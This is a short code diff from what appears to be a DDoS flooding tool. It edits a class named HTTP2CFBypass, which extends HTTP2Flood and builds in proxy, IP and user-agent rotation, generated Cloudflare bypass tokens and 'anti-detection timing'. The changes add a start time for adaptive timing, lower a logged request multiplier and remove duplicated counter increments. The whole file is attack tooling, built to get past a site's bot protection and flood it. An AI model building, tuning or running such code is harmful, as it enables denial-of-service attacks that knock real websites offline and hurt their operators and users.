@@ -212,8 +212,11 @@ export class HTTP2CFBypass extends HTTP2Flood {
         this.ipRotator = globalIPRotator;
         this.uaRotator = globalUserAgentRotator;
         
+        // Initialize start time for adaptive timing
+        this.startTime = Date.now();
+        
         logger.info('🔥 HTTP2-CF ULTIMATE BYPASS WITH ROTATION initialized');
-        logger.info(`   RPC Multiplier: 100x (${this.rpc} requests per batch)`);
+        logger.info(`   RPC Multiplier: 25x (${this.rpc} requests per batch)`);
         logger.info(`   Generated ${this.bypassTokens.turnstile.length + this.bypassTokens.cfClearance.length + this.bypassTokens.jsChallenge.length} bypass tokens`);
         logger.info(`   Proxy Pool: ${this.proxyRotator.getStats().total} proxies`);
         logger.info(`   IP Pool: ${this.ipRotator.getStats().totalIPs} IPs`);
@@ -628,9 +631,6 @@ export class HTTP2CFBypass extends HTTP2Flood {
 
                     req.end();
                     BYTES_SENT.add(500); // Accounting for headers
-                    requestsSent++;
-                    burstCount++;
-                    // Schedule next request with ENHANCED anti-detection timing
                     requestsSent++;
                     burstCount++;
                     
